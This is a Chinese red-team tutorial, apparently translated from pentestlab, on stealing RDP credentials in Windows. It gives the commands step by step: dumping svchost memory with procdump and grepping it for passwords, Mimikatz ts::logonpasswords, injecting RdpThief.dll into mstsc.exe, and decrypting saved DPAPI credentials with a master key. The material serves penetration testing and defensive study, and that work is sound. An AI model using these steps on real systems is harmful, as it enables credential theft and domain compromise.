<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ukkHXYvIw8UJfUs8Rb8HYA)

管理员通常使用远程桌面协议 （RDP） 来远程管理 Windows 环境。在充当跳板机以使用户能够访问其他网络的系统中启用它也是典型的 RDP。然而，虽然这个协议在大多数时候被广泛使用，但是其没有被安全监控或者使用时采用安全措施。

从红队的角度来看，如果已目标机器上存储域管理员帐户的凭据，那么来自 lsass 进程的 dump 凭据可能会导致在网络上横向移动或直接导致整个域泄露。与 RDP 协议关联的进程也可能在红队的范围内，以收集凭据。这些进程是：

```
SVChost.exe
MSTSC.exe

```

可以将上述进程作为检索凭据的替代方法，这时候无需使用 lsass，lsass 通常被 EDR 产品严格监视。

**SVChost**   

svchost.exe 是微软 Windows 操作系统中的系统文件，微软官方对它的解释是：svchost.exe 是从动态链接库 (DLL) 中运行的服务的通用主机进程名称。这个程序对系统的正常运行是非常重要，而且是不能被结束的。许多服务通过注入到该程序中启动，所以会有多个该文件的进程。简单来说就是可以托管多个服务以防止资源消耗。当用户通过 RDP 连接进行身份验证时，终端服务由 svchost 进程托管。根据 Windows 身份验证机制的工作方式，凭据根据 Jonas 的发现以纯文本形式存储在 svchost 进程的内存中。但是，查看进程列表，有多个 svchost 进程，因此可以通过执行以下命令之一来识别哪个进程、主机终端服务连接。

查询终端服务：

```
sc queryex termservice

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHphoVy1mNBWh6j2cuicH6xq5usJfvrnib3fmhuse0faBVicGILy5u2ur5w/640?wx_fmt=png)

查询哪个任务加载了 rdpcorets.dll：

```
tasklist /M:rdpcorets.dll

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHMrfG0hSUMwvyjzAfpc1yhDxTNQrLibHa1tIjKmtrYchAafFZr4OzPxQ/640?wx_fmt=png)

查看网络连接状态：

```
netstat -nob | Select-String TermService -Context 1

```

此命令需要 powershell 运行，不然会报错。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHNDZ1T0icUiaq1QYTWh1ufOHOdSe6ia6dLGL6gCvTia10Wt6fMMYwZnxxvA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHyeqsFJG97SmsdUF3ibHiamk2b7EC1AB920qu6GJkUsFqpbgzhUPsnfeQ/640?wx_fmt=png)

查看进程的内存字符串，密码显示在用户名下方。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHUGjAzx6UroPZ3O11fmOuelDL9IDM4FeQbIvUhamQiajmG9W9ND0ryng/640?wx_fmt=png)

来自 Sysinternals 的进程 dump 工具也可用于通过指定 PID 和. dmp 文件将写入的目录来 dump 内存。

```
procdump64.exe -ma 988 -accepteula C:\Users\pentestlab

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHeBJgiaXmh4ByUP8YSwdWSywGFfQMia8OTYyCPp0KcLJLLicHPibX8OLaibw/640?wx_fmt=png)

.dmp 文件可以进行离线分析。执行简单的 grep 将检索存储在内存文件中的密码。

```
strings -el svchost* | grep Password123 -C3

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdH2B55dffdzVRAb79fVxMicSrXpNJY1quibftPwIjJU8AlEEUeQL4ZjXjA/640?wx_fmt=png)

上述方法并不完全可靠。但是，Mimikatz 支持通过执行以下命令从现有 RDP 连接检索凭据：

```
privilege::debug
ts::logonpasswords

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHoPE11IpwClatDhxDP6VVRrf8Qn6FVuFpq45TWlzcqJyhiaYic1WyPtKg/640?wx_fmt=png)

**MSTSC**

mstsc.exe 进程是在用户打开远程桌面连接应用程序以便通过 RDP 协议连接到其他系统时创建的。API hooking 可用于拦截用户提供的凭据并将其用于横向移动。Rio Sherri 开发了一个名为 RdpThief 的概念验证工具，该工具试图 hooking mstsc process（CredIsMarshaledCredentialW 和 CryptProtectMemory）使用的函数，以便检索凭据并将其写入磁盘上的文件。至于该工具的具体使用可以查看一下链接：

```
https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/

```

工具下载地址如下：

```
https://github.com/0x09AL/RdpThief

```

从 mstsc.exe 正在运行的系统需要将 DLL 注入到进程中。

```
SimpleInjector.exe mstsc.exe RdpThief.dll

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHmm94ftQPcEJlicCZAkNtvY1ibeiamnlpZqv3u1HPWhsFNzppLzO2Vttkg/640?wx_fmt=png)

用户输入用于向目标主机进行身份验证的凭据后，这些凭据将被捕获并写入 C：\temp 文件夹上的文件中。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHIj7hUzUoNiavMuoicDN8CicKSxpbLiaichH7GmzclYvxVnZDDEib0pAicibrRQ/640?wx_fmt=png)

文件还将包括 IP 地址。此信息可用于在网络中横向移动，甚至在使用提升的帐户时提升权限。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHIsCWHZxd2VQkYVicpibdp9YeQBxgmoqGwHHibibrxVgSib7uzN2ZBwOH3Zg/640?wx_fmt=png)

该工具已由 Josh Magri 用 C# 重写。然而，与 RdpThief 相比，SharpRDPThief 使用 IPC 服务器来接收来自 mstsc.exe 进程的凭据。如果 mstsc.exe 终止，服务器将继续运行，当进程再次启动时，将尝试执行挂钩。这消除了 RdpThief 的限制，即该过程应该已经存在。

SharpRDPThief 工具下载地址：

```
https://github.com/passthehashbrowns/SharpRDPThief

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHIhIpOPG5SzyMKKoMOppQV7VIHAQaN7eCJlbfgJ5XKn8Vow0pueAibcg/640?wx_fmt=png)

**RDP 文件**  

通过 RDP 连接对特定主机进行多次身份验证的用户可能会保存连接详细信息以进行快速身份验证。这些凭据通过使用数据保护 API 以加密形式存储在 Windows 的凭据管理器中。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHC4HQsdT6IXtTasCTgLeJta1gzXvnPVIrQvwDBJcScDlY9SSWNJAPeQ/640?wx_fmt=png)

Windows 凭据在磁盘上的位置如下：

```
C:\Users\username\AppData\Local\Microsoft\Credentials

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHwEroibsgOkI3aLpEiazHxTdZGeWQnZice9uLH1ZY0BTUkHnM3Tia6u2FmA/640?wx_fmt=png)

该文件可以通过 Mimikatz 二进制文件查看：

```
dpapi::cred /in:C:\Users\pentestlab\AppData\Local\Microsoft\Credentials\ACC240EEE479C1B634EC496F9838074B

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHwwuSAicADMkCbJpsXibGqo4VkWGEII8C18PcpcZuliaDZtI7VuUJo1lHw/640?wx_fmt=png)

“pbData” 字段包含加密形式的信息。但是，用于解密的主密钥存储在 lsass 中，可以通过执行以下 Mimikatz 模块来检索。“guidMasterKey” 也很重要，因为在查询 lsass 时可能存在多个条目，并且需要将 GUID 与主密钥匹配。

```
sekurlsa::dpapi

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHWPLm4ibExSIsZvnFqiabvycSlpQNawBuSEvbA7t4mTAm42e3ibAQgiaOicA/640?wx_fmt=png)

使用主密钥开关再次执行 dpapi::cred 模块将因此解密内容和 RDP 凭据以纯文本形式披露。

```
dpapi::cred /in:C:\Users\pentestlab\AppData\Local\Microsoft\Credentials\ACC240EEE479C1B634EC496F9838074B
/masterkey:05d8e693421698148d8a4692f27263201f1c65e0b3ac08e3be91ea75f43e71e9b398e2418ba0f0c62ea70a317bdba88f11da3adebd07d65d2b349f933eab85e1

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHaMrnEj7Xibnibib9V2RttL7cHKkYvKbvC6UlnFdxzJkNs9O6NlvpcJj6w/640?wx_fmt=png)

执行以下命令将提供这些凭据所属服务器的详细信息。

```
vault::list

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHRiac3VwKJgKKRE3uwnRkl9IAkI3Kh3Pr4GUnvr32WdlzsA8L9kiacmibw/640?wx_fmt=png)

**引用**

```
https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/
https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/
https://github.com/0x09AL/RdpThief
https://github.com/mantvydasb/RdpThief
https://github.com/passthehashbrowns/SharpRDPThief
https://www.ired.team/offensive-security/code-injection-process-injection/api-monitoring-and-hooking-for-offensive-tooling
https://labs.f-secure.com/blog/attack-detection-fundamentals-2021-windows-lab-3/

```

```
文章来源
https://pentestlab.blog/page/19/

```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/UpWGe2KIPmrTK69EALOypWp8lqEQfBdHUDnDNEicVRoiaCNu2Ta4SoStewWDq7C3SYicAySGa3CuM7RN4BSia0SCcA/640?wx_fmt=jpeg)

**免责声明：  
**

**本公众号漏洞复现文章，SRC、渗透测试等文章，仅供学习参考，请勿用于实战！！有授权情况下除外！！由于传播、利用本公众号文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责**